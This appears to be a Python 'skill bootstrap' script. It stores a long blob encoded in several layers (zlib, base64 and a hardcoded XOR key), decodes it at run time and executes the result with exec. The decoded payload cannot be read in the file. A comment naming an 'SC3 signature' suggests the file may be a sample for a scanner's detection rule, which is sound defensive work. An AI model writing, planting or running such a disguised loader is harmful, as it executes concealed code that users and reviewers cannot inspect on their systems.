#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJx1VVuXqjwW/EE8RIhczqPCSGg4A22iQd8AARMhCsj113+xu8+c7lkzj3slVGrXrl10LcrYKDqghTgV5gyUlPAyanrXOP5We7Uz/Ws9Ld0z9onnwLU1uAW8iu5JaZ6yWLGieSNr0Gl17jlFBQZI2Ng+HyjMT2TWOzPY/9pGy9013i4IrdePJrmN7XQXcZqwYA30v3U2E3Wd+5nYg+d97HGK5X2FSDw+Dy47Byya1yGl/N04PEV4SGMkLEn7do0sy2U0c8xKT20uRlPTyv6+3wc79Tcu4S1X2JzsAggWMISnemRTpxnHM+fjAJrNbY91YKOsEIau9HRfq/GvQVMuCUnG5a2pWyb88oYNErtNl/rek8fv1ZG1ZIw9LcOiZXHK/pXPxJ7VWm/iepqVu6YkmR0A0JNUXdkHy0ap55hMT50QlohrTNYITaAPCN+CWfI/epsArzpfa1h9+zx3YZc6pN40iond9oRj0Oc+vVXh+Izr4ETAooch5Tsffr/PSi6McvhPDatGsWz3cMHx7zWgxV1tuOXmwUtPK8Idu4L6YQtsi7/3Jf7pjBHvLkrZj7wbYLT9fv7Zj5yfgpPbBphf/az1EN/hFowPFtaeO0NjGN5gOSvP2njznMbs8pRUE1YGGBzPBFyV0M9uOwIfLqYZrJXa/IaPfr6XkBx2FraeBLxbzJV+RVZXKFtY8X9XB/+xf6dqV9QXeHUlfpR61xbPQfDxXg+X6QNP6sdK0A3spQe91ADTetduO4jf0o0pQB8i9XVuw/TEzcUIxNuv3cf7J9kvW4Mlr7dRd4dxeuaOCQofi72rKMg/pARDpVA2rKyVO6RvCXbhOq9RdY1HyzXCixOt9ciIVWh/9HOxo77R27/92gGzFHt72wvzLvXJGNH7c/tfethSX9Hea3gOkKsOYVjCXaJYbKae0GBnxPtV1VjgKD7ORzm/pmLzd3984Z0D6fQhdfbDPh6l/scLWhwjtOm0a8EduXFCAk0vajmfeHWX+yLxLz/m/4EX5KvJBA/Xke8hFQzYX1Wt5KfVwa7/6ReEVkpB36tDceqo5p1jDco8cV7zeB6Nlz+FHpKwKXn7xHD6xveHv+W+NI84lPsSV3oU6x/4LnZOCxFy/9VqSk1RG9GemwwArPENn+58+IbXyjyjYcYVqAK34HvloNU0Pwvk6aFfvPKEQ/eQzRS8atmPNWjU9mn/2X/JzTtGrmeTChRzInZE4tnhGQd8sHzKRyDnF5Pv+yL5xlKfReYVHic+PRF/+X8l9aJqxduHW9AQhcqQ2nkt82vQYtcr0WnsyH4l7L96F4yKyTTvInBzGB3AYKB6Ig04UjtzsNqYzl6MbS/z8iTzQgGDmVUbMQ0sdP/M4//773/0o9Dt7Rr3TwpIxkkt+aFqKswB4iii+GtfW7Nx/TyzKVRD9l6PbdNT4xhW3+aP3CSb/T/7tnSUHX3Enl/f910sQ3Rxli6B5JOvUlzIItYt29y2Q3/X6sMF1Ur/9sm3p0WacpN3mfL++j/8mdf02y4bxtPbYYk9G2lGNGdiMuCPPGTxy5/S35G3fu1rFQTlzh8OV0JhsBB+HcTgGskZMcm3Psr726G26fnd9CS/UObNlmtzkhDgLW3wlQ8uPRGu96nQ/wEQ0W48"
_K = bytes.fromhex("9190f3fe7a9ed001fb005197")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
